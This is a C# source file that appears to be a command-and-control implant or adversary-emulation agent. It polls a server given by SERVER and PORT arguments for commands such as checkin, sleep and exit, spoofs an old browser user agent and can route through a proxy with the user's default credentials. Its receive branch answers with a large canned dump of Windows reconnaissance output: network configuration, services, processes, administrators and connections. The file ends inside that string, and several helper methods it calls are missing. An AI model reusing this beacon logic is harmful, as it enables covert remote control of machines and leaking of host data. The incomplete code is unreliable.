using System;
using System.Net;
using System.Linq;
using System.Collections.Generic;
using System.Management.Automation;
using System.Text.RegularExpressions;
using System.Collections.ObjectModel;
using System.Collections;
using System.Text;
using System.Reflection;

namespace shell_ttp
{
    class Program
    {
        string uri;

        static void Main(string[] args)
        {
            AppDomain.CurrentDomain.AssemblyResolve += CurrentDomain_AssemblyResolve;
            try
            {
                PowerShell PowerShellInstance = PowerShell.Create();

                Dictionary<string, string> parsedArgs = ParseCommandArguments(" " + string.Join(" ", args));
                int sleep = 2;
                string uri = string.Format("http://{0}:{1}/", parsedArgs["SERVER"], parsedArgs["PORT"]);
                string proxyAddress = string.Empty;
                bool useProxy = parsedArgs.ContainsKey("PROXY");
                WebClient client = new WebClient();
                IWebProxy proxy = null;

                parsedArgs["USERAGENT"] = parsedArgs.ContainsKey("USERAGENT") ? parsedArgs["USERAGENT"] : "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)";
                if (useProxy)
                {
                    if (parsedArgs.ContainsKey("PROXYADDRESS"))
                    {
                        proxyAddress = parsedArgs["PROXYADDRESS"];
                        proxy = new WebProxy(parsedArgs["PROXYADDRESS"], false, new string[] { }, CredentialCache.DefaultNetworkCredentials);
                    }
                    else
                    {
                        proxy = WebRequest.GetSystemWebProxy();
                        proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
                    }
                }

                client.Proxy = proxy;

                checkIn(uri, parsedArgs["USERAGENT"], client);
                while (true)
                {
                    client.Headers.Add("User-Agent", parsedArgs["USERAGENT"]);
                    client.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
                    client.Headers.Add("Accept", "text/plain");
                    string results = string.Empty;
                    string command = client.DownloadString(uri).Trim();

                    if (command != string.Empty)
                    {
                        if (command.Length >= "checkin".Length && string.Equals(command.Substring(0, "checkin".Length), "checkin", StringComparison.OrdinalIgnoreCase))
                        {
                            results = "Checking in...";
                        }
                        else if (command.Length >= "sleep".Length && string.Equals(command.Substring(0, "sleep".Length), "sleep", StringComparison.OrdinalIgnoreCase))
                        {
                            sleep = Convert.ToInt32(command.Split(' ')[1]);
                            results = string.Format("Sleep updated to {0}", sleep);
                        }
                        else if (command.Length >= "exit".Length && string.Equals(command.Substring(0, "exit".Length), "exit", StringComparison.OrdinalIgnoreCase))
                        {
                            break;
                        }
                        else if (command.Length >= "receive".Length && string.Equals(command.Substring(0, "receive".Length), "receive", StringComparison.OrdinalIgnoreCase))
                        {
                            results = @"
Windows IP Configuration
   Host Name . . . . . . . . . . . . : IEWIN7
   Primary Dns Suffix  . . . . . . . :
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : localdomain

Ethernet adapter Npcap Loopback Adapter:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : Npcap Loopback Adapter
   Physical Address. . . . . . . . . : 02-00-4C-4F-4F-50
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::f89d:7f00:b64d:1c39%15(Preferred)
   Autoconfiguration IPv4 Address. . : 169.254.28.57(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . :
   DHCPv6 IAID . . . . . . . . . . . : 335675468
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-22-31-1B-A8-00-0C-29-E3-36-61
   DNS Servers . . . . . . . . . . . : fec0:0:0:ffff::1%1
                                       fec0:0:0:ffff::2%1
                                       fec0:0:0:ffff::3%1
   NetBIOS over Tcpip. . . . . . . . : Enabled

Ethernet adapter Local Area Connection 2:

   Connection-specific DNS Suffix  . : localdomain
   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection #2
   Physical Address. . . . . . . . . : 00-0C-29-68-D4-AB
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::b4f8:697a:e1fb:614d%14(Preferred)
   IPv4 Address. . . . . . . . . . . : 192.168.202.129(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Lease Obtained. . . . . . . . . . : Wednesday, April 10, 2019 7:04:59 AM
   Lease Expires . . . . . . . . . . : Wednesday, April 10, 2019 8:19:59 AM
   Default Gateway . . . . . . . . . : 192.168.202.2
   DHCP Server . . . . . . . . . . . : 192.168.202.254
   DHCPv6 IAID . . . . . . . . . . . : 285215785
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-22-31-1B-A8-00-0C-29-E3-36-61
   DNS Servers . . . . . . . . . . . : 192.168.202.2
   Primary WINS Server . . . . . . . : 192.168.202.2
   NetBIOS over Tcpip. . . . . . . . : Enabled

Tunnel adapter isatap.localdomain:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : localdomain
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes

Tunnel adapter Local Area Connection* 9:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : Teredo Tunneling Pseudo-Interface
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes

Tunnel adapter isatap.{FB52D7B1-7989-47D6-9675-BFDC84C5C6FB}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter #2
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes


IEWIN7


iewin7\ieuser


These Windows services are started:

   Application Experience
   Background Intelligent Transfer Service
   Base Filtering Engine
   COM+ Event System
   COM+ System Application
   Cryptographic Services
   DCOM Server Process Launcher
   Desktop Window Manager Session Manager
   DHCP Client
   Diagnostic Policy Service
   Diagnostic Service Host
   Diagnostics Tracking Service
   Distributed Link Tracking Client
   Distributed Transaction Coordinator
   DNS Client
   Function Discovery Resource Publication
   Group Policy Client
   IKE and AuthIP IPsec Keying Modules
   Interactive Services Detection
   IP Helper
   IPsec Policy Agent
   McAfee AP Service
   McAfee CSP Service
   McAfee Module Core Service
   McAfee PEF Service
   McAfee Service Controller
   McAfee Solidifier
   McAfee Validation Trust Protection Service
   McAfee WebAdvisor
   Network Connections
   Network List Service
   Network Location Awareness
   Network Store Interface Service
   Offline Files
   OpenSSH Server
   Plug and Play
   Power
   Print Spooler
   Program Compatibility Assistant Service
   Remote Procedure Call (RPC)
   RPC Endpoint Mapper
   Security Accounts Manager
   Security Center
   Server
   Shell Hardware Detection
   Software Protection
   SPP Notification Service
   SSDP Discovery
   System Event Notification Service
   Task Scheduler
   TCP/IP NetBIOS Helper
   Themes
   User Profile Service
   VMware Alias Manager and Ticket Service
   VMware Physical Disk Helper Service
   VMware Tools
   Windows Audio
   Windows Audio Endpoint Builder
   Windows Event Log
   Windows Firewall
   Windows Font Cache Service
   Windows Licensing Monitoring Service
   Windows Management Instrumentation
   Windows Modules Installer
   Windows Search
   Windows Update
   Workstation

The command completed successfully.




Image Name                     PID Session Name        Session#    Mem Usage Status          User Name                                              CPU Time Window Title
========================= ======== ================ =========== ============ =============== ================================================== ============ ========================================================================
System Idle Process              0 Services                   0         24 K Unknown         NT AUTHORITY\SYSTEM                                     0:46:55 N/A
System                           4 Services                   0        432 K Unknown         N/A                                                     0:00:15 N/A
smss.exe                       304 Services                   0      1,192 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
csrss.exe                      472 Services                   0      4,960 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
wininit.exe                    524 Services                   0      4,492 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
csrss.exe                      532 Console                    1     13,316 K Running         NT AUTHORITY\SYSTEM                                     0:00:03 N/A
winlogon.exe                   568 Console                    1      7,316 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
services.exe                   624 Services                   0      8,700 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
lsass.exe                      640 Services                   0     12,504 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:04 N/A
lsm.exe                        648 Services                   0      4,292 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
svchost.exe                    756 Services                   0      9,700 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:01 N/A
vmacthlp.exe                   816 Services                   0      4,272 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
svchost.exe                    848 Services                   0      8,868 K Unknown         NT AUTHORITY\NETWORK SERVICE                            0:00:00 N/A
svchost.exe                    900 Services                   0     17,116 K Unknown         NT AUTHORITY\LOCAL SERVICE                              0:00:02 N/A
svchost.exe                    992 Services                   0     12,444 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
svchost.exe                    204 Services                   0     17,168 K Unknown         NT AUTHORITY\LOCAL SERVICE                              0:00:01 N/A
svchost.exe                    336 Services                   0     33,920 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:08 N/A
svchost.exe                    340 Services                   0      6,296 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
scsrvc.exe                     700 Services                   0        828 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
svchost.exe                   1100 Services                   0     15,420 K Unknown         NT AUTHORITY\NETWORK SERVICE                            0:00:02 N/A
spoolsv.exe                   1364 Services                   0     16,336 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
taskhost.exe                  1424 Console                    1     14,000 K Running         IEWIN7\IEUser                                           0:00:00 MCI command handling window
svchost.exe                   1472 Services                   0     14,744 K Unknown         NT AUTHORITY\LOCAL SERVICE                              0:00:01 N/A
svchost.exe                   1604 Services                   0     11,392 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
svchost.exe                   1644 Services                   0      9,228 K Unknown         NT AUTHORITY\LOCAL SERVICE                              0:00:00 N/A
mfemms.exe                    1676 Services                   0      8,436 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
ModuleCoreService.exe         1760 Services                   0     11,940 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:03 N/A
MMSSHOST.exe                  1852 Services                   0     20,000 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:04 N/A
mfevtps.exe                   1860 Services                   0      9,856 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:03 N/A
ProtectedModuleHost.exe       1892 Services                   0      5,564 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
cygrunsrv.exe                 2012 Services                   0      6,644 K Unknown         IEWIN7\sshd_server                                      0:00:00 N/A
PEFService.exe                1568 Services                   0        204 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
VGAuthService.exe             1284 Services                   0     10,564 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
vmtoolsd.exe                  2052 Services                   0     20,628 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
wlms.exe                      2080 Services                   0      3,664 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
conhost.exe                   2304 Services                   0      3,004 K Unknown         IEWIN7\sshd_server                                      0:00:00 N/A
sshd.exe                      2320 Services                   0      6,176 K Unknown         IEWIN7\sshd_server                                      0:00:00 N/A
taskeng.exe                   2360 Console                    1      6,188 K Running         IEWIN7\IEUser                                           0:00:00 TaskEng - Task Scheduler Engine Process
McInstruTrack.exe             2400 Console                    1        844 K Not Responding  IEWIN7\IEUser                                           0:00:00 OleMainThreadWndName
mfefire.exe                   2412 Services                   0      9,244 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
sppsvc.exe                    2652 Services                   0     11,808 K Unknown         NT AUTHORITY\NETWORK SERVICE                            0:00:00 N/A
svchost.exe                   2788 Services                   0      6,340 K Unknown         NT AUTHORITY\NETWORK SERVICE                            0:00:00 N/A
WmiPrvSE.exe                  2888 Services                   0     17,744 K Unknown         NT AUTHORITY\NETWORK SERVICE                            0:00:07 N/A
dllhost.exe                   3064 Services                   0     11,508 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
McCSPServiceHost.exe          3120 Services                   0      8,460 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:01 N/A
msdtc.exe                     3228 Services                   0      8,412 K Unknown         NT AUTHORITY\NETWORK SERVICE                            0:00:00 N/A
mfevtps.exe                   3788 Services                   0      6,216 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
mcapexe.exe                   3824 Services                   0        628 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
servicehost.exe               3964 Services                   0      9,908 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
MfeAVSvc.exe                   188 Services                   0      7,744 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
uihost.exe                    3952 Console                    1        260 K Unknown         IEWIN7\IEUser                                           0:00:00 N/A
mcshield.exe                  1624 Services                   0     15,676 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:01 N/A
dwm.exe                       4176 Console                    1      5,560 K Running         IEWIN7\IEUser                                           0:00:00 DWM Notification Window
explorer.exe                  4200 Console                    1     69,104 K Running         IEWIN7\IEUser                                           0:00:07 N/A
vmtoolsd.exe                  4292 Console                    1     24,964 K Running         IEWIN7\IEUser                                           0:00:01 N/A
SearchIndexer.exe             4832 Services                   0     20,032 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
iexplore.exe                  5040 Console                    1     33,724 K Running         IEWIN7\IEUser                                           0:00:01 http://1.2.3.4/abcd - Internet Explorer
iexplore.exe                  5112 Console                    1    153,036 K Running         IEWIN7\IEUser                                           0:00:11 N/A
McUICnt.exe                   4004 Console                    1      1,808 K Running         IEWIN7\IEUser                                           0:00:01 N/A
ModuleCoreService.exe         5156 Console                    1      5,060 K Running         IEWIN7\IEUser                                           0:00:00 {30A1588D-127B-4CC0-BA47-B11825F07731}
conhost.exe                   5164 Console                    1      3,408 K Unknown         IEWIN7\IEUser                                           0:00:00 N/A
UI0Detect.exe                 5620 Services                   0      7,100 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
powershell.exe                5536 Console                    1     65,948 K Running         IEWIN7\IEUser                                           0:00:00 Administrator: Windows PowerShell
conhost.exe                   5672 Console                    1      6,224 K Running         IEWIN7\IEUser                                           0:00:00 OleMainThreadWndName
McSmtFwk.exe                  5776 Services                   0        264 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
powershell.exe                6108 Console                    1     46,020 K Unknown         IEWIN7\IEUser                                           0:00:22 N/A
conhost.exe                   5168 Console                    1      3,420 K Unknown         IEWIN7\IEUser                                           0:00:00 N/A
McPvTray.exe                  2356 Console                    1        568 K Running         IEWIN7\IEUser                                           0:00:00 N/A
wuauclt.exe                    876 Console                    1      7,112 K Running         IEWIN7\IEUser                                           0:00:00 Windows Update Taskbar Notification
notepad.exe                   4860 Console                    1      6,560 K Running         IEWIN7\IEUser                                           0:00:00 commands.bat - Notepad
TrustedInstaller.exe          2140 Services                   0     22,544 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:26 N/A
cmd.exe                       5696 Console                    1      3,284 K Running         IEWIN7\IEUser                                           0:00:00 Administrator: C:\Windows\system32\cmd.exe - commands.bat
conhost.exe                   3420 Console                    1      5,260 K Running         IEWIN7\IEUser                                           0:00:00 OleMainThreadWndName
tasklist.exe                   380 Console                    1      6,128 K Unknown         IEWIN7\IEUser                                           0:00:00 N/A



Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
smss.exe                       304 N/A
csrss.exe                      472 N/A
wininit.exe                    524 N/A
csrss.exe                      532 N/A
winlogon.exe                   568 N/A
services.exe                   624 N/A
lsass.exe                      640 SamSs
lsm.exe                        648 N/A
svchost.exe                    756 DcomLaunch, PlugPlay, Power
vmacthlp.exe                   816 VMware Physical Disk Helper Service
svchost.exe                    848 RpcEptMapper, RpcSs
svchost.exe                    900 AudioSrv, Dhcp, eventlog, lmhosts, wscsvc
svchost.exe                    992 AudioEndpointBuilder, CscService, Netman,
                                   PcaSvc, TrkWks, UxSms
svchost.exe                    204 EventSystem, FontCache, netprofm, nsi,
                                   sppuinotify, WdiServiceHost
svchost.exe                    336 AeLookupSvc, BITS, IKEEXT, iphlpsvc,
                                   LanmanServer, ProfSvc, Schedule, SENS,
                                   ShellHWDetection, Themes, Winmgmt, wuauserv
svchost.exe                    340 gpsvc
scsrvc.exe                     700 scsrvc
svchost.exe                   1100 CryptSvc, Dnscache, LanmanWorkstation,
                                   NlaSvc
spoolsv.exe                   1364 Spooler
taskhost.exe                  1424 N/A
svchost.exe                   1472 BFE, DPS, MpsSvc
svchost.exe                   1604 DiagTrack
svchost.exe                   1644 FDResPub, SSDPSRV
mfemms.exe                    1676 mfemms
ModuleCoreService.exe         1760 ModuleCoreService
MMSSHOST.exe                  1852 N/A
mfevtps.exe                   1860 N/A
ProtectedModuleHost.exe       1892 N/A
cygrunsrv.exe                 2012 OpenSSHd
PEFService.exe                1568 PEFService
VGAuthService.exe             1284 VGAuthService
vmtoolsd.exe                  2052 VMTools
wlms.exe                      2080 WLMS
conhost.exe                   2304 N/A
sshd.exe                      2320 N/A
taskeng.exe                   2360 N/A
McInstruTrack.exe             2400 N/A
mfefire.exe                   2412 N/A
sppsvc.exe                    2652 sppsvc
svchost.exe                   2788 PolicyAgent
WmiPrvSE.exe                  2888 N/A
dllhost.exe                   3064 COMSysApp
McCSPServiceHost.exe          3120 mccspsvc
msdtc.exe                     3228 MSDTC
mfevtps.exe                   3788 mfevtp
mcapexe.exe                   3824 McAPExe
servicehost.exe               3964 McAfee WebAdvisor
MfeAVSvc.exe                   188 N/A
uihost.exe                    3952 N/A
mcshield.exe                  1624 N/A
dwm.exe                       4176 N/A
explorer.exe                  4200 N/A
vmtoolsd.exe                  4292 N/A
SearchIndexer.exe             4832 WSearch
iexplore.exe                  5040 N/A
iexplore.exe                  5112 N/A
McUICnt.exe                   4004 N/A
ModuleCoreService.exe         5156 N/A
conhost.exe                   5164 N/A
UI0Detect.exe                 5620 UI0Detect
powershell.exe                5536 N/A
conhost.exe                   5672 N/A
McSmtFwk.exe                  5776 N/A
powershell.exe                6108 N/A
conhost.exe                   5168 N/A
McPvTray.exe                  2356 N/A
wuauclt.exe                    876 N/A
notepad.exe                   4860 N/A
TrustedInstaller.exe          2140 TrustedInstaller
cmd.exe                       5696 N/A
conhost.exe                   3420 N/A
tasklist.exe                  3572 N/A

administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
IEUser
The command completed successfully.




Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:22             0.0.0.0:0              LISTENING       2320
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       848
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:6646           0.0.0.0:0              LISTENING       1852
  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       524
  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       900
  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       336
  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       624
  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       640
  TCP    169.254.28.57:139      0.0.0.0:0              LISTENING       4
  TCP    192.168.202.129:139    0.0.0.0:0              LISTENING       4
  TCP    192.168.202.129:55592  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55593  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55594  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55595  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55596  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55597  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55598  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55599  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55600  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55601  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55602  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55603  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55604  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55605  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55606  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55607  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55608  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55609  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55610  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55611  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55612  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55613  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55614  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55615  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55616  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55617  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55618  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55619  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55620  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55621  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55622  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55623  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55624  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55625  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55626  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55627  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55628  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55629  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55630  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55631  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55632  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55633  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55634  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55635  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55636  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55637  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55638  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55639  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55640  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55641  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55642  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55643  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55644  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55645  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55646  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55647  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55648  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55649  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55650  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55651  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55652  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55653  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55654  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55655  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55656  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55657  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55658  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55659  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55660  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55661  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55662  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55663  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55664  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55665  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55666  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55667  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55668  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55669  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55670  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55671  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55672  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55673  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55674  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55675  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55676  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55677  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55678  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55679  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55680  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55681  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55682  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55683  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55684  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55685  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55686  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55687  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55688  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55689  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55690  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55691  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55692  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55693  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55694  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55695  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55696  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55697  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55698  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55699  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55700  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55701  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55702  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55703  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55704  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55705  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55706  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55707  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55708  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55709  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55710  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55711  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55712  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55713  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55714  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55715  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55716  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55717  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55718  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55719  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55720  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55721  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55722  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55723  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55724  23.177.2.151:443       TIME_WAIT       0
  TCP    192.168.202.129:55725  23.177.2.151:443       TIME_WAIT       0
